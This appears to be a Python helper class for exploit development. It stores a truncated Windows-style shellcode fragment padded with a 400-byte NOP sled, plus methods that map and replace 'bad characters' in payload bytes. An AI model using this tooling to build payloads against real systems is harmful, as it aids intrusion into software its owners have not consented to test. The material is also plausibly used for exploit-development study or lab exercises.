import struct


class SnowCrashShellCode:
    def __init__(self, badChars=None, replaceChars=None):
        self.badChars = badChars
        self.replaceChars = replaceChars
        self.sc = b""

    def WriteShellCode(self):
        self.sc += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52"
        self.sc += b"\x90" * 400

    def SetShellCode(self, sc):
        self.sc = sc

    def GetShellCode(self):
        return self.sc

    def GetBadChars(self):
        return self.badChars

    """
        MapBadChars and EncodeShellcode as for encoding rop chains
    """

    def MapBadChars(self, sh):
        BADCHARS = self.badChars
        i = 0
        badIndex = []
        while i < len(sh):
            for c in BADCHARS:
                if sh[i] == c:
                    badIndex.append(i)
                    break
            i = i+1
        return badIndex

    def EncodeShellcode(self, sh):
        BADCHARS = self.badChars
        REPLACECHARS = self.replaceChars
        encodedShell = sh
        for i in range(len(BADCHARS)):
            encodedShell = encodedShell.replace(struct.pack(
                "B", BADCHARS[i]), struct.pack("B", REPLACECHARS[i]))
        return encodedShell
